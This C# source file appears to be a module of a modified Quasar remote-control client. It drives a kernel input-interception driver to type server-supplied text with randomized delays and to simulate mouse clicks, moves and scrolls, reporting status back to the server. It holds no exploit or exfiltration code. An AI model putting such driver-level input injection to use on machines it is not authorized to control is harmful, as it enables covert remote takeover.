using System;
using System.Drawing;
using System.Threading;

using Quasar.Client.Utilities;

using InputInterceptorNS;
using System.Windows.Forms;
using System.ServiceModel.Channels;
using Quasar.Common.Networking;
using Quasar.Common.Messages;

namespace Quasar.Client.Interception
{
    public class InterceptionHelper
    {      

        private static bool isInitialized = false;

        public static MouseHook mouseHook;
        public static KeyboardHook keyboardHook;
        public static bool isAutoType = false;

        private static void SendKey(Keys key, KeyState state, int sleepAfter = 0, int sleepBefore = 0)
        {
            if (sleepBefore > 0)
            {
                Thread.Sleep(sleepBefore);
            }
            keyboardHook.SetKeyState((InputInterceptorNS.KeyCode)key, state);
            if (sleepAfter > 0)
            {
                Thread.Sleep(sleepAfter);
            }
        }

        private static Keys[] SpecialCharacterToKeysEnum(char c)
        {
            if (c <= 'ü')
            {
                switch (c)
                {
                    case 'À':
                        return new Keys[]
                        {
                        Keys.Insert,
                        Keys.End,
                        Keys.PageUp,
                        Keys.Down
                        };
                    case 'Á':
                    case 'Ã':
                    case 'Å':
                    case 'Ì':
                    case 'Í':
                    case 'Ð':
                    case 'Ñ':
                    case 'Ò':
                    case 'Ó':
                    case 'Õ':
                    case 'Ö':
                    case '×':
                    case 'Ø':
                    case 'Ú':
                    case 'Ý':
                    case 'Þ':
                    case 'ß':
                    case 'á':
                    case 'ã':
                    case 'å':
                    case 'ì':
                    case 'í':
                    case 'ð':
                    case 'ñ':
                    case 'ò':
                    case 'ó':
                        break;
                    case 'Â':
                        return new Keys[]
                        {
                        Keys.Insert,
                        Keys.End,
                        Keys.PageUp,
                        Keys.Left
                        };
                    case 'Ä':
                        return new Keys[]
                        {
                        Keys.Insert,
                        Keys.End,
                        Keys.PageUp,
                        Keys.Right
                        };
                    case 'Æ':
                        return new Keys[]
                        {
                        Keys.Insert,
                        Keys.End,
                        Keys.PageUp,
                        Keys.Up
                        };
                    case 'Ç':
                        return new Keys[]
                        {
                        Keys.Insert,
                        Keys.End,
                        Keys.PageUp,
                        Keys.PageUp
                        };
                    case 'È':
                        return new Keys[]
                        {
                        Keys.Insert,
                        Keys.Down,
                        Keys.Insert,
                        Keys.Insert
                        };
                    case 'É':
                        return new Keys[]
                        {
                        Keys.Insert,
                        Keys.Down,
                        Keys.Insert,
                        Keys.End
                        };
                    case 'Ê':
                        return new Keys[]
                        {
                        Keys.Insert,
                        Keys.Down,
                        Keys.Insert,
                        Keys.Down
                        };
                    case 'Ë':
                        return new Keys[]
                        {
                        Keys.Insert,
                        Keys.Down,
                        Keys.Insert,
                        Keys.PageDown
                        };
                    case 'Î':
                        return new Keys[]
                        {
                        Keys.Insert,
                        Keys.Down,
                        Keys.Insert,
                        Keys.Right
                        };
                    case 'Ï':
                        return new Keys[]
                        {
                        Keys.Insert,
                        Keys.Down,
                        Keys.Insert,
                        Keys.Home
                        };
                    case 'Ô':
                        return new Keys[]
                        {
                        Keys.Insert,
                        Keys.Down,
                        Keys.End,
                        Keys.Down
                        };
                    case 'Ù':
                        return new Keys[]
                        {
                        Keys.Insert,
                        Keys.Down,
                        Keys.End,
                        Keys.Home
                        };
                    case 'Û':
                        return new Keys[]
                        {
                        Keys.Insert,
                        Keys.Down,
                        Keys.End,
                        Keys.PageUp
                        };
                    case 'Ü':
                        return new Keys[]
                        {
                        Keys.Insert,
                        Keys.Down,
                        Keys.Down,
                        Keys.Insert
                        };
                    case 'à':
                        return new Keys[]
                        {
                        Keys.Insert,
                        Keys.Down,
                        Keys.Down,
                        Keys.Left
                        };
                    case 'â':
                        return new Keys[]
                        {
                        Keys.Insert,
                        Keys.Down,
                        Keys.Down,
                        Keys.Right
                        };
                    case 'ä':
                        return new Keys[]
                        {
                        Keys.Insert,
                        Keys.Down,
                        Keys.Down,
                        Keys.Up
                        };
                    case 'æ':
                        return new Keys[]
                        {
                        Keys.Insert,
                        Keys.Down,
                        Keys.PageDown,
                        Keys.Insert
                        };
                    case 'ç':
                        return new Keys[]
                        {
                        Keys.Insert,
                        Keys.Down,
                        Keys.PageDown,
                        Keys.End
                        };
                    case 'è':
                        return new Keys[]
                        {
                        Keys.Insert,
                        Keys.Down,
                        Keys.PageDown,
                        Keys.Down
                        };
                    case 'é':
                        return new Keys[]
                        {
                        Keys.Insert,
                        Keys.Down,
                        Keys.PageDown,
                        Keys.PageDown
                        };
                    case 'ê':
                        return new Keys[]
                        {
                        Keys.Insert,
                        Keys.Down,
                        Keys.PageDown,
                        Keys.Left
                        };
                    case 'ë':
                        return new Keys[]
                        {
                        Keys.Insert,
                        Keys.Down,
                        Keys.PageDown,
                        Keys.Numpad5
                        };
                    case 'î':
                        return new Keys[]
                        {
                        Keys.Insert,
                        Keys.Down,
                        Keys.PageDown,
                        Keys.Up
                        };
                    case 'ï':
                        return new Keys[]
                        {
                        Keys.Insert,
                        Keys.Down,
                        Keys.PageDown,
                        Keys.PageUp
                        };
                    case 'ô':
                        return new Keys[]
                        {
                        Keys.Insert,
                        Keys.Down,
                        Keys.Left,
                        Keys.Left
                        };
                    default:
                        switch (c)
                        {
                            case 'ù':
                                return new Keys[]
                                {
                            Keys.Insert,
                            Keys.Down,
                            Keys.Left,
                            Keys.PageUp
                                };
                            case 'û':
                                return new Keys[]
                                {
                            Keys.Insert,
                            Keys.Down,
                            Keys.Numpad5,
                            Keys.End
                                };
                            case 'ü':
                                return new Keys[]
                                {
                            Keys.Insert,
                            Keys.Down,
                            Keys.Numpad5,
                            Keys.Down
                                };
                        }
                        break;
                }
            }
            else
            {
                if (c == 'Œ')
                {
                    return new Keys[]
                    {
                        Keys.Insert,
                        Keys.End,
                        Keys.Left,
                        Keys.Insert
                    };
                }
                if (c == 'œ')
                {
                    return new Keys[]
                    {
                        Keys.Insert,
                        Keys.End,
                        Keys.Numpad5,
                        Keys.Right
                    };
                }
                switch (c)
                {
                    case '–':
                        return new Keys[]
                        {
                        Keys.Insert,
                        Keys.End,
                        Keys.Numpad5,
                        Keys.Insert
                        };
                    case '—':
                        return new Keys[]
                        {
                        Keys.Insert,
                        Keys.End,
                        Keys.Numpad5,
                        Keys.End
                        };
                    case '‘':
                        return new Keys[]
                        {
                        Keys.Insert,
                        Keys.End,
                        Keys.Left,
                        Keys.Numpad5
                        };
                    case '’':
                        return new Keys[]
                        {
                        Keys.Insert,
                        Keys.End,
                        Keys.Left,
                        Keys.Right
                        };
                    case '“':
                        return new Keys[]
                        {
                        Keys.Insert,
                        Keys.End,
                        Keys.Left,
                        Keys.Home
                        };
                    case '”':
                        return new Keys[]
                        {
                        Keys.Insert,
                        Keys.End,
                        Keys.Left,
                        Keys.Up
                        };
                }
            }
            return new Keys[]
            {
                Keys.DashUnderscore
            };
        }

        private static Tuple<Keys, bool> CharacterToKeysEnum(char c)
        {
            switch (c)
            {
                case '\n':
                    return new Tuple<Keys, bool>(Keys.Enter, false);
                case ' ':
                    return new Tuple<Keys, bool>(Keys.Space, true);
                case '!':
                    return new Tuple<Keys, bool>(Keys.One, true);
                case '"':
                    return new Tuple<Keys, bool>(Keys.SingleDoubleQuote, true);
                case '#':
                    return new Tuple<Keys, bool>(Keys.Three, true);
                case '$':
                    return new Tuple<Keys, bool>(Keys.Four, true);
                case '%':
                    return new Tuple<Keys, bool>(Keys.Five, true);
                case '&':
                    return new Tuple<Keys, bool>(Keys.Seven, true);
                case '\'':
                    return new Tuple<Keys, bool>(Keys.SingleDoubleQuote, false);
                case '(':
                    return new Tuple<Keys, bool>(Keys.Nine, true);
                case ')':
                    return new Tuple<Keys, bool>(Keys.Zero, true);
                case '*':
                    return new Tuple<Keys, bool>(Keys.Eight, true);
                case '+':
                    return new Tuple<Keys, bool>(Keys.PlusEquals, true);
                case ',':
                    return new Tuple<Keys, bool>(Keys.CommaLeftArrow, false);
                case '-':
                    return new Tuple<Keys, bool>(Keys.DashUnderscore, false);
                case '.':
                    return new Tuple<Keys, bool>(Keys.PeriodRightArrow, false);
                case '/':
                    return new Tuple<Keys, bool>(Keys.ForwardSlashQuestionMark, false);
                case '0':
                    return new Tuple<Keys, bool>(Keys.Zero, false);
                case '1':
                    return new Tuple<Keys, bool>(Keys.One, false);
                case '2':
                    return new Tuple<Keys, bool>(Keys.Two, false);
                case '3':
                    return new Tuple<Keys, bool>(Keys.Three, false);
                case '4':
                    return new Tuple<Keys, bool>(Keys.Four, false);
                case '5':
                    return new Tuple<Keys, bool>(Keys.Five, false);
                case '6':
                    return new Tuple<Keys, bool>(Keys.Six, false);
                case '7':
                    return new Tuple<Keys, bool>(Keys.Seven, false);
                case '8':
                    return new Tuple<Keys, bool>(Keys.Eight, false);
                case '9':
                    return new Tuple<Keys, bool>(Keys.Nine, false);
                case ':':
                    return new Tuple<Keys, bool>(Keys.SemicolonColon, true);
                case ';':
                    return new Tuple<Keys, bool>(Keys.SemicolonColon, false);
                case '<':
                    return new Tuple<Keys, bool>(Keys.CommaLeftArrow, true);
                case '=':
                    return new Tuple<Keys, bool>(Keys.PlusEquals, false);
                case '>':
                    return new Tuple<Keys, bool>(Keys.PeriodRightArrow, true);
                case '?':
                    return new Tuple<Keys, bool>(Keys.ForwardSlashQuestionMark, true);
                case '@':
                    return new Tuple<Keys, bool>(Keys.Two, true);
                case 'A':
                    return new Tuple<Keys, bool>(Keys.A, true);
                case 'B':
                    return new Tuple<Keys, bool>(Keys.B, true);
                case 'C':
                    return new Tuple<Keys, bool>(Keys.C, true);
                case 'D':
                    return new Tuple<Keys, bool>(Keys.D, true);
                case 'E':
                    return new Tuple<Keys, bool>(Keys.E, true);
                case 'F':
                    return new Tuple<Keys, bool>(Keys.F, true);
                case 'G':
                    return new Tuple<Keys, bool>(Keys.G, true);
                case 'H':
                    return new Tuple<Keys, bool>(Keys.H, true);
                case 'I':
                    return new Tuple<Keys, bool>(Keys.I, true);
                case 'J':
                    return new Tuple<Keys, bool>(Keys.J, true);
                case 'K':
                    return new Tuple<Keys, bool>(Keys.K, true);
                case 'L':
                    return new Tuple<Keys, bool>(Keys.L, true);
                case 'M':
                    return new Tuple<Keys, bool>(Keys.M, true);
                case 'N':
                    return new Tuple<Keys, bool>(Keys.N, true);
                case 'O':
                    return new Tuple<Keys, bool>(Keys.O, true);
                case 'P':
                    return new Tuple<Keys, bool>(Keys.P, true);
                case 'Q':
                    return new Tuple<Keys, bool>(Keys.Q, true);
                case 'R':
                    return new Tuple<Keys, bool>(Keys.R, true);
                case 'S':
                    return new Tuple<Keys, bool>(Keys.S, true);
                case 'T':
                    return new Tuple<Keys, bool>(Keys.T, true);
                case 'U':
                    return new Tuple<Keys, bool>(Keys.U, true);
                case 'V':
                    return new Tuple<Keys, bool>(Keys.V, true);
                case 'W':
                    return new Tuple<Keys, bool>(Keys.W, true);
                case 'X':
                    return new Tuple<Keys, bool>(Keys.X, true);
                case 'Y':
                    return new Tuple<Keys, bool>(Keys.Y, true);
                case 'Z':
                    return new Tuple<Keys, bool>(Keys.Z, true);
                case '[':
                    return new Tuple<Keys, bool>(Keys.OpenBracketBrace, false);
                case '\\':
                    return new Tuple<Keys, bool>(Keys.BackslashPipe, false);
                case ']':
                    return new Tuple<Keys, bool>(Keys.CloseBracketBrace, false);
                case '^':
                    return new Tuple<Keys, bool>(Keys.Six, true);
                case '_':
                    return new Tuple<Keys, bool>(Keys.DashUnderscore, true);
                case '`':
                    return new Tuple<Keys, bool>(Keys.Tilde, false);
                case 'a':
                    return new Tuple<Keys, bool>(Keys.A, false);
                case 'b':
                    return new Tuple<Keys, bool>(Keys.B, false);
                case 'c':
                    return new Tuple<Keys, bool>(Keys.C, false);
                case 'd':
                    return new Tuple<Keys, bool>(Keys.D, false);
                case 'e':
                    return new Tuple<Keys, bool>(Keys.E, false);
                case 'f':
                    return new Tuple<Keys, bool>(Keys.F, false);
                case 'g':
                    return new Tuple<Keys, bool>(Keys.G, false);
                case 'h':
                    return new Tuple<Keys, bool>(Keys.H, false);
                case 'i':
                    return new Tuple<Keys, bool>(Keys.I, false);
                case 'j':
                    return new Tuple<Keys, bool>(Keys.J, false);
                case 'k':
                    return new Tuple<Keys, bool>(Keys.K, false);
                case 'l':
                    return new Tuple<Keys, bool>(Keys.L, false);
                case 'm':
                    return new Tuple<Keys, bool>(Keys.M, false);
                case 'n':
                    return new Tuple<Keys, bool>(Keys.N, false);
                case 'o':
                    return new Tuple<Keys, bool>(Keys.O, false);
                case 'p':
                    return new Tuple<Keys, bool>(Keys.P, false);
                case 'q':
                    return new Tuple<Keys, bool>(Keys.Q, false);
                case 'r':
                    return new Tuple<Keys, bool>(Keys.R, false);
                case 's':
                    return new Tuple<Keys, bool>(Keys.S, false);
                case 't':
                    return new Tuple<Keys, bool>(Keys.T, false);
                case 'u':
                    return new Tuple<Keys, bool>(Keys.U, false);
                case 'v':
                    return new Tuple<Keys, bool>(Keys.V, false);
                case 'w':
                    return new Tuple<Keys, bool>(Keys.W, false);
                case 'x':
                    return new Tuple<Keys, bool>(Keys.X, false);
                case 'y':
                    return new Tuple<Keys, bool>(Keys.Y, false);
                case 'z':
                    return new Tuple<Keys, bool>(Keys.Z, false);
                case '{':
                    return new Tuple<Keys, bool>(Keys.OpenBracketBrace, true);
                case '|':
                    return new Tuple<Keys, bool>(Keys.BackslashPipe, true);
                case '}':
                    return new Tuple<Keys, bool>(Keys.CloseBracketBrace, true);
                case '~':
                    return new Tuple<Keys, bool>(Keys.Tilde, true);
            }
            return new Tuple<Keys, bool>(Keys.ForwardSlashQuestionMark, true);
        }


        public static  Boolean InitializeDriver(ISender client)
        {
            if (InputInterceptor.CheckDriverInstalled())
            {
                //if (InputInterceptor.Initialize())
                //{
                try
                {
                    mouseHook = new MouseHook(null);
                    keyboardHook = new KeyboardHook(null);
                    isInitialized = true;
                }
                catch (Exception e) {
                    client.Send(new NotifyMessageToServer { Message = "Creating KB/M hooks error: " + e.Message });
                }
                client.Send(new NotifyMessageToServer { Type = "kbm_drv", Message = "KBMDRVICUR" });
                return true;
                //}
                //client.Send(new NotifyMessageToServer { Message = "KB/M driver initialization failed!" });
            }
            else
            {
                client.Send(new NotifyMessageToServer { Type = "kbm_drv", Message = "KBMDRVNOTI" });
                return false;
            }
        }

        private static Tuple<Keys, KeyState> ConvertKeycodeToInterceptionKeys(byte key, bool keyDown)
        {
            Keys item = (Keys)0;
            KeyState keyState = KeyState.Down;
            switch (key)
            {
                case 8:
                    item = Keys.Backspace;
                    break;
                case 9:
                    item = Keys.Tab;
                    break;
                case 10:
                case 11:
                case 12:
                case 14:
                case 15:
                case 16:
                case 17:
                case 18:
                case 21:
                case 22:
                case 23:
                case 24:
                case 25:
                case 26:
                case 28:
                case 29:
                case 30:
                case 31:
                case 41:
                case 42:
                case 43:
                case 47:
                case 58:
                case 59:
                case 60:
                case 61:
                case 62:
                case 63:
                case 64:
                case 92:
                case 94:
                case 95:
                case 108:
                case 110:
                case 124:
                case 125:
                case 126:
                case 127:
                case 128:
                case 129:
                case 130:
                case 131:
                case 132:
                case 133:
                case 134:
                case 135:
                case 136:
                case 137:
                case 138:
                case 139:
                case 140:
                case 141:
                case 142:
                case 143:
                case 146:
                case 147:
                case 148:
                case 149:
                case 150:
                case 151:
                case 152:
                case 153:
                case 154:
                case 155:
                case 156:
                case 157:
                case 158:
                case 159:
                case 166:
                case 167:
                case 168:
                case 169:
                case 170:
                case 171:
                case 172:
                case 173:
                case 174:
                case 175:
                case 176:
                case 177:
                case 178:
                case 179:
                case 180:
                case 181:
                case 182:
                case 183:
                case 184:
                case 185:
                    break;
                case 13:
                    item = Keys.Enter;
                    break;
                case 19:
                    item = Keys.Control;
                    keyState |= KeyState.E1;
                    break;
                case 20:
                    item = Keys.CapsLock;
                    break;
                case 27:
                    item = Keys.Escape;
                    break;
                case 32:
                    item = Keys.Space;
                    break;
                case 33:
                    item = Keys.PageUp;
                    keyState |= KeyState.E0;
                    break;
                case 34:
                    item = Keys.PageDown;
                    keyState |= KeyState.E0;
                    break;
                case 35:
                    item = Keys.End;
                    keyState |= KeyState.E0;
                    break;
                case 36:
                    item = Keys.Home;
                    keyState |= KeyState.E0;
                    break;
                case 37:
                    item = Keys.Left;
                    keyState |= KeyState.E0;
                    break;
                case 38:
                    item = Keys.Up;
                    keyState |= KeyState.E0;
                    break;
                case 39:
                    item = Keys.Right;
                    keyState |= KeyState.E0;
                    break;
                case 40:
                    item = Keys.Down;
                    keyState |= KeyState.E0;
                    break;
                case 44:
                    item = Keys.PrintScreen;
                    break;
                case 45:
                    item = Keys.Insert;
                    keyState |= KeyState.E0;
                    break;
                case 46:
                    item = Keys.Delete;
                    keyState |= KeyState.E0;
                    break;
                case 48:
                    item = Keys.Zero;
                    break;
                case 49:
                    item = Keys.One;
                    break;
                case 50:
                    item = Keys.Two;
                    break;
                case 51:
                    item = Keys.Three;
                    break;
                case 52:
                    item = Keys.Four;
                    break;
                case 53:
                    item = Keys.Five;
                    break;
                case 54:
                    item = Keys.Six;
                    break;
                case 55:
                    item = Keys.Seven;
                    break;
                case 56:
                    item = Keys.Eight;
                    break;
                case 57:
                    item = Keys.Nine;
                    break;
                case 65:
                    item = Keys.A;
                    break;
                case 66:
                    item = Keys.B;
                    break;
                case 67:
                    item = Keys.C;
                    break;
                case 68:
                    item = Keys.D;
                    break;
                case 69:
                    item = Keys.E;
                    break;
                case 70:
                    item = Keys.F;
                    break;
                case 71:
                    item = Keys.G;
                    break;
                case 72:
                    item = Keys.H;
                    break;
                case 73:
                    item = Keys.I;
                    break;
                case 74:
                    item = Keys.J;
                    break;
                case 75:
                    item = Keys.K;
                    break;
                case 76:
                    item = Keys.L;
                    break;
                case 77:
                    item = Keys.M;
                    break;
                case 78:
                    item = Keys.N;
                    break;
                case 79:
                    item = Keys.O;
                    break;
                case 80:
                    item = Keys.P;
                    break;
                case 81:
                    item = Keys.Q;
                    break;
                case 82:
                    item = Keys.R;
                    break;
                case 83:
                    item = Keys.S;
                    break;
                case 84:
                    item = Keys.T;
                    break;
                case 85:
                    item = Keys.U;
                    break;
                case 86:
                    item = Keys.V;
                    break;
                case 87:
                    item = Keys.W;
                    break;
                case 88:
                    item = Keys.X;
                    break;
                case 89:
                    item = Keys.Y;
                    break;
                case 90:
                    item = Keys.Z;
                    break;
                case 91:
                    item = Keys.WindowsKey;
                    keyState |= KeyState.E0;
                    break;
                case 93:
                    item = Keys.Menu;
                    keyState |= KeyState.E0;
                    break;
                case 96:
                    item = Keys.Insert;
                    break;
                case 97:
                    item = Keys.End;
                    break;
                case 98:
                    item = Keys.Down;
                    break;
                case 99:
                    item = Keys.PageDown;
                    break;
                case 100:
                    item = Keys.Left;
                    break;
                case 101:
                    item = Keys.Numpad5;
                    break;
                case 102:
                    item = Keys.Right;
                    break;
                case 103:
                    item = Keys.Home;
                    break;
                case 104:
                    item = Keys.Up;
                    break;
                case 105:
                    item = Keys.PageUp;
                    break;
                case 106:
                    item = Keys.PrintScreen;
                    break;
                case 107:
                    item = Keys.NumpadPlus;
                    break;
                case 109:
                    item = Keys.NumpadMinus;
                    break;
                case 111:
                    item = Keys.ForwardSlashQuestionMark;
                    keyState |= KeyState.E0;
                    break;
                case 112:
                    item = Keys.F1;
                    break;
                case 113:
                    item = Keys.F2;
                    break;
                case 114:
                    item = Keys.F3;
                    break;
                case 115:
                    item = Keys.F4;
                    break;
                case 116:
                    item = Keys.F5;
                    break;
                case 117:
                    item = Keys.F6;
                    break;
                case 118:
                    item = Keys.F7;
                    break;
                case 119:
                    item = Keys.F8;
                    break;
                case 120:
                    item = Keys.F9;
                    break;
                case 121:
                    item = Keys.F10;
                    break;
                case 122:
                    item = Keys.F11;
                    break;
                case 123:
                    item = Keys.F12;
                    break;
                case 144:
                    item = Keys.NumLock;
                    break;
                case 145:
                    item = Keys.ScrollLock;
                    break;
                case 160:
                    item = Keys.LeftShift;
                    break;
                case 161:
                    item = Keys.RightShift;
                    break;
                case 162:
                    item = Keys.Control;
                    break;
                case 163:
                    item = Keys.Control;
                    keyState |= KeyState.E0;
                    break;
                case 164:
                    item = Keys.RightAlt;
                    break;
                case 165:
                    item = Keys.RightAlt;
                    keyState |= KeyState.E0;
                    break;
                case 186:
                    item = Keys.SemicolonColon;
                    break;
                case 187:
                    item = Keys.PlusEquals;
                    break;
                case 188:
                    item = Keys.CommaLeftArrow;
                    break;
                case 189:
                    item = Keys.DashUnderscore;
                    break;
                case 190:
                    item = Keys.PeriodRightArrow;
                    break;
                case 191:
                    item = Keys.ForwardSlashQuestionMark;
                    break;
                case 192:
                    item = Keys.Tilde;
                    break;
                default:
                    switch (key)
                    {
                        case 219:
                            item = Keys.OpenBracketBrace;
                            break;
                        case 220:
                            item = Keys.BackslashPipe;
                            break;
                        case 221:
                            item = Keys.CloseBracketBrace;
                            break;
                        case 222:
                            item = Keys.SingleDoubleQuote;
                            break;
                    }
                    break;
            }
            if (!keyDown)
            {
                keyState |= KeyState.Up;
            }
            return new Tuple<Keys, KeyState>(item, keyState);
        }

        public static void KenelKeyPress(byte keyCode, bool keyDown) {
            Quasar.Client.Interception.Keys keys;
            KeyState state;
            ConvertKeycodeToInterceptionKeys(keyCode, keyDown).Deconstruct(out keys, out state);
            if (keyDown) keyboardHook.SimulateKeyDown((InputInterceptorNS.KeyCode)keys);
            else keyboardHook.SimulateKeyUp((InputInterceptorNS.KeyCode)keys);
        }

        //public static void SendText(string text, ISender client, int minDelay=30, int maxDelay = 65)
        //{
        //    Random random = new Random();

        //    keyboardHook.SimulateInput(text, random.Next(minDelay, maxDelay));
        //}

        public static void SendText(string text, ISender client,int minDelay = 30, int maxDelay = 65)
        {
            Random random = new Random();

            if (isInitialized)
            {
                foreach (char c in text)
                {
                    if (!isAutoType)
                    {
                        break;
                    }
                    if ("ÀÂÄÆÇÈÉÊËÎÏÔŒÙÛÜàâäæçèéêëîïôœùûü–—‘’“”".IndexOf(c) >= 0)
                    {
                        Keys[] array = SpecialCharacterToKeysEnum(c);
                        SendKey(Keys.RightAlt, KeyState.Down, random.Next(minDelay, maxDelay), 0);
                        foreach (Keys key in array)
                        {
                            SendKey(key, KeyState.Down, minDelay, 0);
                            SendKey(key, KeyState.Up, minDelay, 0);
                        }
                        SendKey(Keys.RightAlt, KeyState.Up,random.Next(minDelay, maxDelay), 0);
                    }
                    else
                    {
                        Tuple<Keys, bool> tuple = CharacterToKeysEnum(c);
                        if (tuple.Item2)
                        {
                            SendKey(Keys.LeftShift, KeyState.Down, minDelay, 0);
                        }
                        SendKey(tuple.Item1, KeyState.Down, random.Next(minDelay, maxDelay), 0);
                        SendKey(tuple.Item1, KeyState.Up, random.Next(minDelay, maxDelay), 0);
                        if (tuple.Item2)
                        {
                            SendKey(Keys.LeftShift, KeyState.Up, minDelay, 0);
                        }
                    }
                }
                client.Send(new NotifyMessageToServer { Message = "[+] Autotype done or stopped!" });
            }
        }

        public static bool KernelDoMouseLeftClick(Point p, bool isMouseDown)
        {
            if (isMouseDown)
                return mouseHook.SimulateLeftButtonDown();
            else
                return mouseHook.SimulateLeftButtonUp();
        }

        public static bool KernelDoMouseRightClick(Point p, bool isMouseDown)
        {
            if (isMouseDown)
                return mouseHook.SimulateRightButtonDown();
            else
                return mouseHook.SimulateRightButtonUp();
        }

        public static bool KernelDoMouseMove(Point p)
        {
            return mouseHook.SetCursorPosition(p.X, p.Y);
        }

        public static bool KernelDoMouseScroll(Point p, bool scrollDown)
        {
            if (scrollDown)
                return mouseHook.SimulateScrollDown();
            else
                return mouseHook.SimulateScrollUp();
        }
    }

}
